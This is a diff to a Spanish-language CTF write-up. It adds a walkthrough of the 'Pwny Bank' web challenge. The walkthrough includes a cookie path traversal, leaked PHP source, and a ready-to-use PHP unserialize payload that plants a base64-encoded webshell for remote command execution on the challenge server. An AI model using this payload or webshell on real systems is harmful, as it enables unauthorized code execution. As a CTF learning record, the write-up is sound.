@@ -4,7 +4,8 @@
 * [Stego - Paperrolling](#stego---paperrolling)
 * [Stego - DNACovid19](#stego---dnacovid19)
 * [Stego - TODOVAASALIRBIEN](#stego---todovaasalirbien)
-* [Forensics - wall_paint](forensics---wall_paint)
+* [Forensics - wall_paint](#forensics---wall_paint)
+* [Web - Pwny Bank](#web---pwny-bank)
 
 
 ## Welcome
@@ -111,14 +112,68 @@ Lo extraigo de Autopsy y con `dpkg -e corpwallpaper_1.0.deb` vuelco los scripts 
 
 **flag{ur_1nf3ct3d_&lt;redacted>}**
 
-ph -> pphh
+
+## Web - Pwny Bank
+<p align="center">
+  <img src="images/pwnybank.png">
+</p>
+<p align="center">
+  <img src="images/w_pwny_1.png">
+</p>
+
+La página muestra una descripción de su utilidad y un formulario, que al rellenarlo y enviarlo muestra un mensaje de creación de una contraseña, y su almacenamiento en una BD (en un .txt, ole).
+
+<p align="center">
+  <img src="images/w_pwny_2.png">
+</p>
+
+En el codigo fuente hay un comentario que parece una pista: 
+`<!--(admin notes)Only administrator can manage this secure password store server. Since we're lazy, we take advantage to properly manage user passwords via GET.-->`. 
+
+Como no están permitidos los fuzzers en los retos web, pruebo a mirar el archivo `robots.txt`:
 ```
-Luego se organizaría en la forma: <payload_cr><payload_ed>s.<payload_ph>p
+User-agent: *
+Disallow: backup.txt
+Disallow: /tmp
+Disallow: /info
+```
 
-En python se puede generar bien rápido así: (img)
+El archivo de texto `backup.txt` contiene el mensaje `MOVED OUTSIDE WEBDIR FOR SECURITY REASONS`.
 
-Este es el input que use en el reto: `cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrreeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddds.ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppphhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhp:1337@lol.lol`
+En el directorio `/tmp/` se lista un directorio con un nombre de usuario que contiene lo que parece ser su contraseña, y me doy cuenta que se cambia de usuario cada 10 segundos. Lo que hice durante el CTF y que al final fue un callejón sin salida, fue ir descargando con wget recursivamente cada 10 segundos el contenido de este directorio, con la esperanza de que la flag apareciera en alguno de estos usuarios o contraseñas. Sin embargo, no resultó.
 
-Cuyo SHA1 es: 9e64b58bf2f273142a77ce091a00555f04bfa717
+En el directorio `/info/` hay 2 archivos de texto: `admin.txt` y `pwnyBank.txt`. El primero contiene el mensaje `Admin include information: I hope that my workers know how to manage user's passwords of the bank in a directory in web application, with the procedure that was explained last week.`, lo que indica que hay algún directorio en la aplicación en el que se están tratando las contraseñas de los usuarios. El segundo archivo de texto contiene el mismo texto que aparece en la página, y me doy cuenta que hay una cookie `user` con el valor `pwnyBank`. Si cambio su valor a admin, aparece el texto de `admin.txt`, por lo que se me ocurre tratar de llegar al archivo `backup.txt` que mencionan que se ha movido fuera el directorio web. Para ello le doy el valor `../../backup` a la cookie, mostrándome el contenido del archivo:
+```
+class SecurePasswordManager{
+    function __construct() {
+    }
+    
+   
+    function __destruct() {
+        $sid = session_id();
+        mkdir("/app/public/tmp/{$sid}/");
+        $filesize = file_put_contents("/app/public/tmp/{$sid}/{$this->filename}", $this->content);
+        $filename = "/app/public/tmp/{$sid}/{$this->filename}";
+        if ($filesize === 48){
+            echo "Administrator feature: Uploaded user password file";
+            $password = file_get_contents($filename);
+            $content= base64_decode($password);
+            $file = fopen($filename, 'w');    
+            fwrite($file, $content);
+            fclose($file);
+            echo "[+] Debug: Done";
+      }
+      else {
+        unlink($filename);
+      }
+    }
+}
 
-Finalmente, para conseguir dumpear la variable "info", ejecuto los siguientes comandos:
+$data = unserialize($_GET['data']);
+```
+
+Nada más ver en unserialize pienso en el típico exploit para conseguir ejecutar código (https://www.notsosecure.com/remote-code-execution-via-php-unserialize/). Como no hay ninguna limitación del nombre del archivo, puedo aprovechar para subir una webshell en PHP. La única limitación es que el tamaño de la webshell en Base64 debe ser exactamente de 48 caracteres. Este tamaño da de sobra con `<?php  system($_GET['cmd']);     ?>` a la cual le añado espacios para que su Base64 tenga 48 caracteres exactos. Luego la subida se realizaría con `http://157.230.107.175:8001/?data=O:21:"SecurePasswordManager":2:{s:8:"filename";s:11:"exploit.php";s:7:"content";s:48:"PD9waHAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOyAgICAgPz4=";}`
+
+Accediendo al archivo `/tmp/<mi-sid-que-no-me-acuerdo>/exploit.php` veo que puedo ejecutar comandos, aunque tengo que volver a ejecutar la subida cada 10 segundos ya que el contenido de `/tmp` se regenera. Acabo encontrando la flag en la raíz del sistema.
+
+**flag{n41v3n0m_&lt;redacted>}**
